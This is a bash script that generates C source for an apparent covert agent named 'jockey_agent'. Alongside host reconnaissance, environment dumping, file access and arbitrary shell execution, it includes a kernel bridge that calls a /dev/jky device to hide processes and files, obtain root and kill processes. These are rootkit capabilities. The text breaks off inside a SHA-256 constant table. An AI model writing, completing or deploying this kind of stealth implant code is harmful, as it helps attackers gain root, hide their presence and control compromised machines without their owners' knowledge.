#!/usr/bin/env bash
set -e

# Verify we're in the right place
if [ ! -f Makefile ] && [ ! -d src ]; then
  echo "Run this from jockey_agent/linux/"
  exit 1
fi

mkdir -p include src/builtins src/platform/linux kmod

# ============================================================
# include/jky_platform.h
# ============================================================
cat > include/jky_platform.h <<'EOF'
#ifndef JKY_PLATFORM_H
#define JKY_PLATFORM_H

#include <stddef.h>
#include <stdint.h>

const char *jky_platform_name(void);
int  jky_hostname(char *buf, size_t len);
int  jky_username(char *buf, size_t len);
int  jky_kernel_version(char *buf, size_t len);
int  jky_arch(char *buf, size_t len);
int64_t jky_uptime_sec(void);
int  jky_cpu_count(void);
int64_t jky_total_mem(void);
int64_t jky_free_mem(void);

int64_t jky_time_sec(void);
void    jky_sleep_ms(int ms);

int jky_getpid(void);
int jky_getppid(void);
int jky_kill(int pid, int sig);

int  jky_cwd(char *buf, size_t len);
int  jky_chdir(const char *path);
int  jky_list_dir(const char *path, char ***out_names, int *out_count);
void jky_free_list(char **names, int count);
int  jky_read_file(const char *path, uint8_t **out, size_t *out_len);
int  jky_write_file(const char *path, const uint8_t *data, size_t len);
int  jky_file_exists(const char *path);
int64_t jky_file_size(const char *path);

#endif
EOF

# ============================================================
# include/jky_kernel_bridge.h
# ============================================================
cat > include/jky_kernel_bridge.h <<'EOF'
#ifndef JKY_KERNEL_BRIDGE_H
#define JKY_KERNEL_BRIDGE_H

int  jky_kmod_ensure_loaded(void);
void jky_kmod_close(void);

int  jky_kmod_hide_pid(int pid);
int  jky_kmod_unhide_pid(int pid);
int  jky_kmod_hide_file(const char *path);
int  jky_kmod_unhide_file(const char *path);
int  jky_kmod_get_root(void);
int  jky_kmod_kill(int pid);

#endif
EOF

# ============================================================
# include/jky_builtins.h (updated)
# ============================================================
cat > include/jky_builtins.h <<'EOF'
#ifndef JKY_BUILTINS_H
#define JKY_BUILTINS_H

#include "jockey_vm.h"

typedef enum {
    BUILTIN_OK        = 0,
    BUILTIN_NOT_FOUND = 1,
    BUILTIN_ERROR     = 2,
} BuiltinResult;

typedef struct {
    const char    *name;
    int            min_args;
    int            max_args;
    BuiltinResult (*fn)(VM *vm, Value *args, int argc, Value *out);
} Builtin;

BuiltinResult builtin_call(VM *vm, const char *name,
                           Value *args, int argc, Value *out);
int builtin_exists(const char *name);

extern const Builtin BUILTINS_PURE[];
extern const Builtin BUILTINS_SYSTEM[];
extern const Builtin BUILTINS_FS[];
extern const Builtin BUILTINS_DATA[];
extern const Builtin BUILTINS_CRYPTO[];
extern const Builtin BUILTINS_KERNEL[];

#endif
EOF

# ============================================================
# src/platform/linux/platform.c
# ============================================================
cat > src/platform/linux/platform.c <<'EOF'
#define _GNU_SOURCE
#include "jky_platform.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <sys/utsname.h>
#include <sys/stat.h>

const char *jky_platform_name(void) { return "linux"; }

int jky_hostname(char *buf, size_t len) {
    if (gethostname(buf, len) != 0) { buf[0] = 0; return -1; }
    buf[len - 1] = 0;
    return 0;
}

int jky_username(char *buf, size_t len) {
    const char *u = getenv("USER");
    if (!u) u = getenv("USERNAME");
    if (!u) u = getlogin();
    if (!u) { buf[0] = 0; return -1; }
    strncpy(buf, u, len - 1);
    buf[len - 1] = 0;
    return 0;
}

int jky_kernel_version(char *buf, size_t len) {
    struct utsname u;
    if (uname(&u) != 0) { buf[0] = 0; return -1; }
    strncpy(buf, u.release, len - 1);
    buf[len - 1] = 0;
    return 0;
}

int jky_arch(char *buf, size_t len) {
    struct utsname u;
    if (uname(&u) != 0) { buf[0] = 0; return -1; }
    strncpy(buf, u.machine, len - 1);
    buf[len - 1] = 0;
    return 0;
}

int64_t jky_uptime_sec(void) {
    FILE *f = fopen("/proc/uptime", "r");
    if (!f) return 0;
    double up = 0;
    if (fscanf(f, "%lf", &up) != 1) up = 0;
    fclose(f);
    return (int64_t)up;
}

int jky_cpu_count(void) {
    long n = sysconf(_SC_NPROCESSORS_ONLN);
    return n > 0 ? (int)n : 0;
}

int64_t jky_total_mem(void) {
    FILE *f = fopen("/proc/meminfo", "r");
    if (!f) return 0;
    char key[64]; long val; char unit[16];
    int64_t total = 0;
    while (fscanf(f, "%63s %ld %15s", key, &val, unit) == 3) {
        if (strcmp(key, "MemTotal:") == 0) { total = (int64_t)val * 1024; break; }
    }
    fclose(f);
    return total;
}

int64_t jky_free_mem(void) {
    FILE *f = fopen("/proc/meminfo", "r");
    if (!f) return 0;
    char key[64]; long val; char unit[16];
    int64_t free_mem = 0;
    while (fscanf(f, "%63s %ld %15s", key, &val, unit) == 3) {
        if (strcmp(key, "MemAvailable:") == 0) { free_mem = (int64_t)val * 1024; break; }
        if (strcmp(key, "MemFree:") == 0 && free_mem == 0)
            free_mem = (int64_t)val * 1024;
    }
    fclose(f);
    return free_mem;
}

int64_t jky_time_sec(void) { return (int64_t)time(NULL); }

void jky_sleep_ms(int ms) {
    if (ms <= 0) return;
    struct timespec ts;
    ts.tv_sec  = ms / 1000;
    ts.tv_nsec = (ms % 1000) * 1000000L;
    nanosleep(&ts, NULL);
}

int jky_getpid(void)  { return (int)getpid(); }
int jky_getppid(void) { return (int)getppid(); }

int jky_kill(int pid, int sig) {
    return kill(pid, sig == 0 ? SIGTERM : sig);
}

int jky_cwd(char *buf, size_t len) {
    if (!getcwd(buf, len)) { buf[0] = 0; return -1; }
    return 0;
}

int jky_chdir(const char *path) { return chdir(path); }

int jky_list_dir(const char *path, char ***out_names, int *out_count) {
    DIR *d = opendir(path);
    if (!d) return -1;

    int cap = 16, n = 0;
    char **names = malloc(cap * sizeof(char *));
    struct dirent *e;
    while ((e = readdir(d)) != NULL) {
        if (strcmp(e->d_name, ".") == 0 || strcmp(e->d_name, "..") == 0) continue;
        if (n >= cap) { cap *= 2; names = realloc(names, cap * sizeof(char *)); }
        names[n++] = strdup(e->d_name);
    }
    closedir(d);

    for (int i = 1; i < n; i++) {
        char *k = names[i];
        int j = i - 1;
        while (j >= 0 && strcmp(names[j], k) > 0) {
            names[j + 1] = names[j];
            j--;
        }
        names[j + 1] = k;
    }

    *out_names = names;
    *out_count = n;
    return 0;
}

void jky_free_list(char **names, int count) {
    if (!names) return;
    for (int i = 0; i < count; i++) free(names[i]);
    free(names);
}

int jky_read_file(const char *path, uint8_t **out, size_t *out_len) {
    FILE *f = fopen(path, "rb");
    if (!f) return -1;
    fseek(f, 0, SEEK_END);
    long n = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (n < 0) { fclose(f); return -1; }
    uint8_t *buf = malloc((size_t)n ? (size_t)n : 1);
    size_t got = fread(buf, 1, (size_t)n, f);
    fclose(f);
    *out = buf;
    *out_len = got;
    return 0;
}

int jky_write_file(const char *path, const uint8_t *data, size_t len) {
    FILE *f = fopen(path, "wb");
    if (!f) return -1;
    size_t w = fwrite(data, 1, len, f);
    fclose(f);
    return w == len ? 0 : -1;
}

int jky_file_exists(const char *path) {
    struct stat st;
    return stat(path, &st) == 0;
}

int64_t jky_file_size(const char *path) {
    struct stat st;
    if (stat(path, &st) != 0) return -1;
    return (int64_t)st.st_size;
}
EOF

# ============================================================
# src/platform/linux/kernel_bridge.c
# ============================================================
cat > src/platform/linux/kernel_bridge.c <<'EOF'
#define _GNU_SOURCE
#include "jky_kernel_bridge.h"

#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/stat.h>

#define JKY_MAGIC 'J'
#define JKY_CMD_HIDE_PID     _IOW(JKY_MAGIC, 1, struct jky_req)
#define JKY_CMD_UNHIDE_PID   _IOW(JKY_MAGIC, 2, struct jky_req)
#define JKY_CMD_HIDE_FILE    _IOW(JKY_MAGIC, 3, struct jky_req)
#define JKY_CMD_UNHIDE_FILE  _IOW(JKY_MAGIC, 4, struct jky_req)
#define JKY_CMD_GET_ROOT     _IO (JKY_MAGIC, 5)
#define JKY_CMD_KILL_PID     _IOW(JKY_MAGIC, 8, struct jky_req)
#define JKY_CMD_PING         _IO (JKY_MAGIC, 99)

struct jky_req {
    int32_t  pid;
    uint64_t addr;
    uint64_t size;
    char     path[256];
    char     pad[64];
};

static int g_fd = -1;

static int open_dev(void) {
    if (g_fd >= 0) return g_fd;
    g_fd = open("/dev/jky", O_RDWR);
    return g_fd;
}

int jky_kmod_ensure_loaded(void) {
    if (open_dev() < 0) return -1;
    return ioctl(g_fd, JKY_CMD_PING, 0) == 0x4a4b59 ? 0 : -1;
}

void jky_kmod_close(void) {
    if (g_fd >= 0) { close(g_fd); g_fd = -1; }
}

int jky_kmod_hide_pid(int pid) {
    if (open_dev() < 0) return -1;
    struct jky_req r; memset(&r, 0, sizeof(r));
    r.pid = pid;
    return ioctl(g_fd, JKY_CMD_HIDE_PID, &r);
}

int jky_kmod_unhide_pid(int pid) {
    if (open_dev() < 0) return -1;
    struct jky_req r; memset(&r, 0, sizeof(r));
    r.pid = pid;
    return ioctl(g_fd, JKY_CMD_UNHIDE_PID, &r);
}

int jky_kmod_hide_file(const char *path) {
    if (open_dev() < 0) return -1;
    struct jky_req r; memset(&r, 0, sizeof(r));
    strncpy(r.path, path, sizeof(r.path) - 1);
    return ioctl(g_fd, JKY_CMD_HIDE_FILE, &r);
}

int jky_kmod_unhide_file(const char *path) {
    if (open_dev() < 0) return -1;
    struct jky_req r; memset(&r, 0, sizeof(r));
    strncpy(r.path, path, sizeof(r.path) - 1);
    return ioctl(g_fd, JKY_CMD_UNHIDE_FILE, &r);
}

int jky_kmod_get_root(void) {
    if (open_dev() < 0) return -1;
    return ioctl(g_fd, JKY_CMD_GET_ROOT, 0);
}

int jky_kmod_kill(int pid) {
    if (open_dev() < 0) return -1;
    struct jky_req r; memset(&r, 0, sizeof(r));
    r.pid = pid;
    return ioctl(g_fd, JKY_CMD_KILL_PID, &r);
}
EOF

# ============================================================
# src/builtins/system.c
# ============================================================
cat > src/builtins/system.c <<'EOF'
#include "jky_builtins.h"
#include "jky_platform.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static BuiltinResult bi_platform(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)a; (void)c;
    *out = mkstr(jky_platform_name());
    return BUILTIN_OK;
}

static BuiltinResult bi_hostname(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)a; (void)c;
    char buf[256] = {0};
    jky_hostname(buf, sizeof(buf));
    *out = mkstr(buf);
    return BUILTIN_OK;
}

static BuiltinResult bi_username(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)a; (void)c;
    char buf[256] = {0};
    jky_username(buf, sizeof(buf));
    *out = mkstr(buf);
    return BUILTIN_OK;
}

static BuiltinResult bi_kernel_ver(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)a; (void)c;
    char buf[256] = {0};
    jky_kernel_version(buf, sizeof(buf));
    *out = mkstr(buf);
    return BUILTIN_OK;
}

static BuiltinResult bi_arch(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)a; (void)c;
    char buf[128] = {0};
    jky_arch(buf, sizeof(buf));
    *out = mkstr(buf);
    return BUILTIN_OK;
}

static BuiltinResult bi_cpus(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)a; (void)c;
    *out = mkint(jky_cpu_count());
    return BUILTIN_OK;
}

static BuiltinResult bi_uptime(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)a; (void)c;
    *out = mkint(jky_uptime_sec());
    return BUILTIN_OK;
}

static BuiltinResult bi_memory(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)a; (void)c;
    Value d = mkdict();
    dict_set(d.v.dict, "total",     mkint(jky_total_mem()));
    dict_set(d.v.dict, "free",      mkint(jky_free_mem()));
    dict_set(d.v.dict, "available", mkint(jky_free_mem()));
    *out = d;
    return BUILTIN_OK;
}

static BuiltinResult bi_info(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)a; (void)c;
    char host[256] = {0}, user[256] = {0}, kver[256] = {0}, arch[128] = {0};
    jky_hostname(host, sizeof(host));
    jky_username(user, sizeof(user));
    jky_kernel_version(kver, sizeof(kver));
    jky_arch(arch, sizeof(arch));

    Value d = mkdict();
    dict_set(d.v.dict, "os",       mkstr("Linux"));
    dict_set(d.v.dict, "arch",     mkstr(arch));
    dict_set(d.v.dict, "hostname", mkstr(host));
    dict_set(d.v.dict, "user",     mkstr(user));
    dict_set(d.v.dict, "cpus",     mkint(jky_cpu_count()));
    dict_set(d.v.dict, "kernel",   mkstr(kver));
    *out = d;
    return BUILTIN_OK;
}

static BuiltinResult bi_time(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)a; (void)c;
    *out = mkint(jky_time_sec());
    return BUILTIN_OK;
}

static BuiltinResult bi_sleep(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)c;
    if (a[0].type != VT_INT) {
        value_set_error("system_sleep: int required");
        return BUILTIN_ERROR;
    }
    jky_sleep_ms((int)a[0].v.i);
    *out = mknone();
    return BUILTIN_OK;
}

extern char **environ;

static BuiltinResult bi_env(VM *vm, Value *a, int c, Value *out) {
    (void)vm;
    if (c == 1) {
        if (a[0].type != VT_STR) {
            value_set_error("system_env: string required");
            return BUILTIN_ERROR;
        }
        const char *v = getenv(a[0].v.s);
        *out = v ? mkstr(v) : mknone();
        return BUILTIN_OK;
    }
    Value d = mkdict();
    for (char **p = environ; *p; p++) {
        const char *eq = strchr(*p, '=');
        if (!eq) continue;
        size_t klen = (size_t)(eq - *p);
        char *key = malloc(klen + 1);
        memcpy(key, *p, klen);
        key[klen] = 0;
        dict_set(d.v.dict, key, mkstr(eq + 1));
        free(key);
    }
    *out = d;
    return BUILTIN_OK;
}

static BuiltinResult bi_shell(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)c;
    if (a[0].type != VT_STR) {
        value_set_error("system_shell: string required");
        return BUILTIN_ERROR;
    }

    FILE *pf = popen(a[0].v.s, "r");
    if (!pf) { *out = mkstr(""); return BUILTIN_OK; }

    size_t cap = 4096, n = 0;
    char *buf = malloc(cap);
    size_t got;
    while ((got = fread(buf + n, 1, cap - n - 1, pf)) > 0) {
        n += got;
        if (n + 1 >= cap) { cap *= 2; buf = realloc(buf, cap); }
    }
    pclose(pf);
    buf[n] = 0;

    *out = mkstr(buf);
    free(buf);
    return BUILTIN_OK;
}

const Builtin BUILTINS_SYSTEM[] = {
    { "system_platform",       0, 0, bi_platform   },
    { "system_hostname",       0, 0, bi_hostname   },
    { "system_username",       0, 0, bi_username   },
    { "system_kernel_version", 0, 0, bi_kernel_ver },
    { "system_arch",           0, 0, bi_arch       },
    { "system_cpus",           0, 0, bi_cpus       },
    { "system_uptime",         0, 0, bi_uptime     },
    { "system_memory",         0, 0, bi_memory     },
    { "system_info",           0, 0, bi_info       },
    { "system_time",           0, 0, bi_time       },
    { "system_sleep",          1, 1, bi_sleep      },
    { "system_env",            0, 1, bi_env        },
    { "system_shell",          1, 1, bi_shell      },
    { NULL, 0, 0, NULL },
};
EOF

# ============================================================
# src/builtins/fs.c
# ============================================================
cat > src/builtins/fs.c <<'EOF'
#include "jky_builtins.h"
#include "jky_platform.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>

static BuiltinResult bi_cwd(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)a; (void)c;
    char buf[4096] = {0};
    if (jky_cwd(buf, sizeof(buf)) != 0) {
        value_set_error("fs_cwd failed");
        return BUILTIN_ERROR;
    }
    *out = mkstr(buf);
    return BUILTIN_OK;
}

static BuiltinResult bi_chdir(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)c;
    if (a[0].type != VT_STR) {
        value_set_error("fs_chdir: string required");
        return BUILTIN_ERROR;
    }
    *out = mkbool(jky_chdir(a[0].v.s) == 0);
    return BUILTIN_OK;
}

static BuiltinResult bi_list_dir(VM *vm, Value *a, int c, Value *out) {
    (void)vm;
    const char *path = ".";
    if (c == 1) {
        if (a[0].type != VT_STR) {
            value_set_error("fs_list_dir: string required");
            return BUILTIN_ERROR;
        }
        path = a[0].v.s;
    }

    char **names = NULL;
    int n = 0;
    if (jky_list_dir(path, &names, &n) != 0) {
        *out = mkarray();
        return BUILTIN_OK;
    }
    Value arr = mkarray();
    for (int i = 0; i < n; i++) arr_push(arr.v.arr, mkstr(names[i]));
    jky_free_list(names, n);
    *out = arr;
    return BUILTIN_OK;
}

static BuiltinResult bi_read(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)c;
    if (a[0].type != VT_STR) {
        value_set_error("fs_read: string required");
        return BUILTIN_ERROR;
    }
    uint8_t *data = NULL;
    size_t len = 0;
    if (jky_read_file(a[0].v.s, &data, &len) != 0) {
        *out = mknone();
        return BUILTIN_OK;
    }
    Value v;
    v.type = VT_BYTES;
    v.rc   = 0;
    v.v.bytes.data = data;
    v.v.bytes.len  = len;
    *out = v;
    return BUILTIN_OK;
}

static BuiltinResult bi_write(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)c;
    if (a[0].type != VT_STR) {
        value_set_error("fs_write: path must be string");
        return BUILTIN_ERROR;
    }

    const uint8_t *data = NULL;
    size_t len = 0;

    if (a[1].type == VT_STR) {
        data = (const uint8_t *)a[1].v.s;
        len  = strlen(a[1].v.s);
    } else if (a[1].type == VT_BYTES) {
        data = a[1].v.bytes.data;
        len  = a[1].v.bytes.len;
    } else {
        value_set_error("fs_write: data must be string or bytes");
        return BUILTIN_ERROR;
    }

    *out = mkbool(jky_write_file(a[0].v.s, data, len) == 0);
    return BUILTIN_OK;
}

static BuiltinResult bi_exists(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)c;
    if (a[0].type != VT_STR) { *out = mkbool(0); return BUILTIN_OK; }
    *out = mkbool(jky_file_exists(a[0].v.s));
    return BUILTIN_OK;
}

static BuiltinResult bi_size(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)c;
    if (a[0].type != VT_STR) { *out = mkint(-1); return BUILTIN_OK; }
    *out = mkint(jky_file_size(a[0].v.s));
    return BUILTIN_OK;
}

static BuiltinResult bi_stat(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)c;
    if (a[0].type != VT_STR) {
        value_set_error("fs_stat: string required");
        return BUILTIN_ERROR;
    }
    struct stat st;
    if (stat(a[0].v.s, &st) != 0) {
        *out = mknone();
        return BUILTIN_OK;
    }
    Value d = mkdict();
    dict_set(d.v.dict, "size",  mkint((int64_t)st.st_size));
    dict_set(d.v.dict, "mode",  mkint((int64_t)st.st_mode));
    dict_set(d.v.dict, "mtime", mkint((int64_t)st.st_mtime));
    dict_set(d.v.dict, "ctime", mkint((int64_t)st.st_ctime));
    dict_set(d.v.dict, "atime", mkint((int64_t)st.st_atime));
    dict_set(d.v.dict, "uid",   mkint((int64_t)st.st_uid));
    dict_set(d.v.dict, "gid",   mkint((int64_t)st.st_gid));
    dict_set(d.v.dict, "inode", mkint((int64_t)st.st_ino));
    *out = d;
    return BUILTIN_OK;
}

static BuiltinResult bi_hash_dir(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)a; (void)c;
    *out = mkdict();
    return BUILTIN_OK;
}

static BuiltinResult bi_hide(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)a; (void)c;
    *out = mkbool(0);
    return BUILTIN_OK;
}

static BuiltinResult bi_unhide(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)a; (void)c;
    *out = mkbool(0);
    return BUILTIN_OK;
}

const Builtin BUILTINS_FS[] = {
    { "fs_cwd",      0, 0, bi_cwd      },
    { "fs_chdir",    1, 1, bi_chdir    },
    { "fs_list_dir", 0, 1, bi_list_dir },
    { "fs_read",     1, 1, bi_read     },
    { "fs_write",    2, 2, bi_write    },
    { "fs_exists",   1, 1, bi_exists   },
    { "fs_size",     1, 1, bi_size     },
    { "fs_stat",     1, 1, bi_stat     },
    { "fs_hash_dir", 1, 1, bi_hash_dir },
    { "fs_hide",     1, 1, bi_hide     },
    { "fs_unhide",   1, 1, bi_unhide   },
    { NULL, 0, 0, NULL },
};
EOF

# ============================================================
# src/builtins/data.c
# ============================================================
cat > src/builtins/data.c <<'EOF'
#include "jky_builtins.h"
#include "jky_platform.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

static BuiltinResult bi_hex_dump(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)c;
    const uint8_t *data = NULL;
    size_t len = 0;

    if (a[0].type == VT_BYTES) {
        data = a[0].v.bytes.data;
        len  = a[0].v.bytes.len;
    } else if (a[0].type == VT_STR) {
        data = (const uint8_t *)a[0].v.s;
        len  = strlen(a[0].v.s);
    } else {
        *out = mkstr("");
        return BUILTIN_OK;
    }

    size_t cap = len * 3 + 1;
    char *buf = malloc(cap);
    size_t n = 0;
    for (size_t i = 0; i < len; i++) {
        if (i) buf[n++] = ' ';
        n += snprintf(buf + n, cap - n, "%02x", data[i]);
    }
    buf[n] = 0;
    *out = mkstr(buf);
    free(buf);
    return BUILTIN_OK;
}

static BuiltinResult bi_timestamp(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)a; (void)c;
    *out = mkint(jky_time_sec());
    return BUILTIN_OK;
}

static BuiltinResult bi_uuid(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)a; (void)c;

    FILE *f = fopen("/dev/urandom", "rb");
    if (!f) {
        *out = mkstr("00000000-0000-4000-8000-000000000000");
        return BUILTIN_OK;
    }
    uint8_t b[16];
    size_t got = fread(b, 1, 16, f);
    fclose(f);
    if (got != 16) {
        *out = mkstr("00000000-0000-4000-8000-000000000000");
        return BUILTIN_OK;
    }

    b[6] = (b[6] & 0x0f) | 0x40;
    b[8] = (b[8] & 0x3f) | 0x80;

    char buf[40];
    snprintf(buf, sizeof(buf),
        "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
        b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7],
        b[8], b[9], b[10], b[11], b[12], b[13], b[14], b[15]);
    *out = mkstr(buf);
    return BUILTIN_OK;
}

static BuiltinResult bi_random_bytes(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)c;
    if (a[0].type != VT_INT) {
        value_set_error("data_random_bytes: int required");
        return BUILTIN_ERROR;
    }
    int64_t n = a[0].v.i;
    if (n < 0) n = 0;

    Value v;
    v.type = VT_BYTES;
    v.rc   = 0;
    v.v.bytes.len  = (size_t)n;
    v.v.bytes.data = malloc((size_t)n ? (size_t)n : 1);
    if (n > 0) {
        FILE *f = fopen("/dev/urandom", "rb");
        if (f) {
            fread(v.v.bytes.data, 1, (size_t)n, f);
            fclose(f);
        } else {
            memset(v.v.bytes.data, 0, (size_t)n);
        }
    }
    *out = v;
    return BUILTIN_OK;
}

static int is_unreserved(unsigned char c) {
    return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
           (c >= '0' && c <= '9') ||
           c == '-' || c == '_' || c == '.' || c == '~';
}

static BuiltinResult bi_url_encode(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)c;
    if (a[0].type != VT_STR) { *out = mkstr(""); return BUILTIN_OK; }
    const unsigned char *s = (const unsigned char *)a[0].v.s;
    size_t n = strlen(a[0].v.s);
    size_t cap = n * 3 + 1;
    char *buf = malloc(cap);
    size_t k = 0;
    for (size_t i = 0; i < n; i++) {
        if (is_unreserved(s[i])) buf[k++] = (char)s[i];
        else k += snprintf(buf + k, cap - k, "%%%02X", s[i]);
    }
    buf[k] = 0;
    *out = mkstr(buf);
    free(buf);
    return BUILTIN_OK;
}

static int hexval(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return 10 + c - 'a';
    if (c >= 'A' && c <= 'F') return 10 + c - 'A';
    return -1;
}

static BuiltinResult bi_url_decode(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)c;
    if (a[0].type != VT_STR) { *out = mkstr(""); return BUILTIN_OK; }
    const char *s = a[0].v.s;
    size_t n = strlen(s);
    char *buf = malloc(n + 1);
    size_t k = 0;
    for (size_t i = 0; i < n; i++) {
        if (s[i] == '%' && i + 2 < n) {
            int h = hexval(s[i + 1]);
            int l = hexval(s[i + 2]);
            if (h >= 0 && l >= 0) {
                buf[k++] = (char)((h << 4) | l);
                i += 2;
                continue;
            }
        }
        if (s[i] == '+') buf[k++] = ' ';
        else buf[k++] = s[i];
    }
    buf[k] = 0;
    *out = mkstr(buf);
    free(buf);
    return BUILTIN_OK;
}

const Builtin BUILTINS_DATA[] = {
    { "data_hex_dump",     1, 1, bi_hex_dump     },
    { "data_timestamp",    0, 0, bi_timestamp    },
    { "data_uuid",         0, 0, bi_uuid         },
    { "data_random_bytes", 1, 1, bi_random_bytes },
    { "data_url_encode",   1, 1, bi_url_encode   },
    { "data_url_decode",   1, 1, bi_url_decode   },
    { NULL, 0, 0, NULL },
};
EOF

# ============================================================
# src/builtins/crypto.c
# ============================================================
cat > src/builtins/crypto.c <<'EOF'
#include "jky_builtins.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

typedef struct { uint32_t state[4]; uint64_t count; uint8_t buffer[64]; } md5_ctx;

static const uint32_t md5_k[64] = {
    0xd76aa478,0xe8c7b756,0x242070db,0xc1bdceee,0xf57c0faf,0x4787c62a,0xa8304613,0xfd469501,
    0x698098d8,0x8b44f7af,0xffff5bb1,0x895cd7be,0x6b901122,0xfd987193,0xa679438e,0x49b40821,
    0xf61e2562,0xc040b340,0x265e5a51,0xe9b6c7aa,0xd62f105d,0x02441453,0xd8a1e681,0xe7d3fbc8,
    0x21e1cde6,0xc33707d6,0xf4d50d87,0x455a14ed,0xa9e3e905,0xfcefa3f8,0x676f02d9,0x8d2a4c8a,
    0xfffa3942,0x8771f681,0x6d9d6122,0xfde5380c,0xa4beea44,0x4bdecfa9,0xf6bb4b60,0xbebfbc70,
    0x289b7ec6,0xeaa127fa,0xd4ef3085,0x04881d05,0xd9d4d039,0xe6db99e5,0x1fa27cf8,0xc4ac5665,
    0xf4292244,0x432aff97,0xab9423a7,0xfc93a039,0x655b59c3,0x8f0ccc92,0xffeff47d,0x85845dd1,
    0x6fa87e4f,0xfe2ce6e0,0xa3014314,0x4e0811a1,0xf7537e82,0xbd3af235,0x2ad7d2bb,0xeb86d391,
};

static const uint8_t md5_s[64] = {
    7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22,
    5, 9,14,20,5, 9,14,20,5, 9,14,20,5, 9,14,20,
    4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23,
    6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21,
};

#define ROTL32(x,n) (((x) << (n)) | ((x) >> (32 - (n))))

static void md5_transform(uint32_t st[4], const uint8_t blk[64]) {
    uint32_t m[16];
    for (int i = 0; i < 16; i++)
        m[i] = (uint32_t)blk[i*4] | ((uint32_t)blk[i*4+1] << 8) |
               ((uint32_t)blk[i*4+2] << 16) | ((uint32_t)blk[i*4+3] << 24);

    uint32_t a = st[0], b = st[1], c = st[2], d = st[3];
    for (int i = 0; i < 64; i++) {
        uint32_t f, g;
        if (i < 16)      { f = (b & c) | (~b & d); g = i; }
        else if (i < 32) { f = (d & b) | (~d & c); g = (5*i + 1) % 16; }
        else if (i < 48) { f = b ^ c ^ d;          g = (3*i + 5) % 16; }
        else             { f = c ^ (b | ~d);       g = (7*i) % 16; }
        f = f + a + md5_k[i] + m[g];
        a = d; d = c; c = b;
        b = b + ROTL32(f, md5_s[i]);
    }
    st[0] += a; st[1] += b; st[2] += c; st[3] += d;
}

static void md5_init(md5_ctx *c) {
    c->state[0] = 0x67452301; c->state[1] = 0xefcdab89;
    c->state[2] = 0x98badcfe; c->state[3] = 0x10325476;
    c->count = 0;
}

static void md5_update(md5_ctx *c, const uint8_t *data, size_t len) {
    size_t idx = (size_t)(c->count & 63);
    c->count += len;
    size_t part = 64 - idx;
    size_t i = 0;
    if (len >= part) {
        memcpy(c->buffer + idx, data, part);
        md5_transform(c->state, c->buffer);
        for (i = part; i + 63 < len; i += 64)
            md5_transform(c->state, data + i);
        idx = 0;
    }
    memcpy(c->buffer + idx, data + i, len - i);
}

static void md5_final(md5_ctx *c, uint8_t out[16]) {
    uint64_t bits = c->count * 8;
    size_t idx = (size_t)(c->count & 63);
    static const uint8_t pad[64] = { 0x80 };
    size_t padlen = (idx < 56) ? (56 - idx) : (120 - idx);
    md5_update(c, pad, padlen);
    uint8_t lenbuf[8];
    for (int i = 0; i < 8; i++) lenbuf[i] = (bits >> (8*i)) & 0xff;
    md5_update(c, lenbuf, 8);
    for (int i = 0; i < 4; i++) {
        out[i*4]   = (c->state[i]      ) & 0xff;
        out[i*4+1] = (c->state[i] >>  8) & 0xff;
        out[i*4+2] = (c->state[i] >> 16) & 0xff;
        out[i*4+3] = (c->state[i] >> 24) & 0xff;
    }
}

typedef struct { uint32_t state[8]; uint64_t count; uint8_t buffer[64]; } sha_ctx;

static const uint32_t sha_k[64] = {
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
